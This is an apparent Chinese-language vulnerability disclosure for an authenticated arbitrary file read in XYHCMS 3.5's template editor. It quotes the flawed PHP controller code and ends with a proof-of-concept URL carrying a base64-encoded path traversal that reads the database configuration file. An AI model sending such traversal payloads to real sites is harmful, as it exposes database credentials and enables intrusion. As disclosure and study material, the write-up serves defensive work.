XYHCMS 3.5 后台任意文件读取
===========================

一、漏洞简介
------------

二、漏洞影响
------------

XYHCMS 3.5

三、复现过程
------------

### 漏洞分析

漏洞文件位置：`/App/Manage/Controller/TempletsController.class.php`
第59-83行：

    public function edit() {
            $ftype     = I('ftype', 0, 'intval');
            $fname     = I('fname', '', 'trim,htmlspecialchars');
            $file_path = !$ftype ? './Public/Home/' . C('CFG_THEMESTYLE') . '/' : './Public/Mobile/' . C('CFG_MOBILE_THEMESTYLE') . '/';
            if (IS_POST) {
                if (empty($fname)) {
                    $this->error('未指定文件名');
                }
                $_ext     = '.' . pathinfo($fname, PATHINFO_EXTENSION);
                $_cfg_ext = C('TMPL_TEMPLATE_SUFFIX');
                if ($_ext != $_cfg_ext) {
                    $this->error('文件后缀必须为"' . $_cfg_ext . '"');
                }
                $content  = I('content', '', '');
                $fname    = ltrim($fname, './');
                $truefile = $file_path . $fname;
                if (false !== file_put_contents($truefile, $content)) {
                    $this->success('保存成功', U('index', array('ftype' => $ftype)));
                } else {
                    $this->error('保存文件失败，请重试');
                }
                exit();
            }
            $fname = base64_decode($fname);
            if (empty($fname)) {
                $this->error('未指定要编辑的文件');
            }
            $truefile = $file_path . $fname;

            if (!file_exists($truefile)) {
                $this->error('文件不存在');
            }
            $content = file_get_contents($truefile);
            if ($content === false) {
                $this->error('读取文件失败');
            }
            $content = htmlspecialchars($content);

            $this->assign('ftype', $ftype);
            $this->assign('fname', $fname);
            $this->assign('content', $content);
            $this->assign('type', '修改模板');
            $this->display();
        }

这段函数中对提交的参数进行处理，然后判断是否POST数据上来，如果有就进行保存等，如果没有POST数据，将跳过这段代码继续向下执行。

我们可以通过GET传入fname，跳过前面的保存文件过程，进入文件读取状态。

对fname进行base64解码，判断fname参数是否为空，拼接成完整的文件路径，然后判断这个文件是否存在，读取文件内容。

对fname未进行任何限制，导致程序在实现上存在任意文件读取漏洞。

### 漏洞复现：

登录网站后台，数据库配置文件路径：`\App\Common\Conf\db.php`我们将这段组成相对路径，`..\\..\\..\\App\\Common\\Conf\\db.php`，然后进行base64编码，`Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==`

最后构造的链接形式如下：`http://www.0-sec.org/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==`
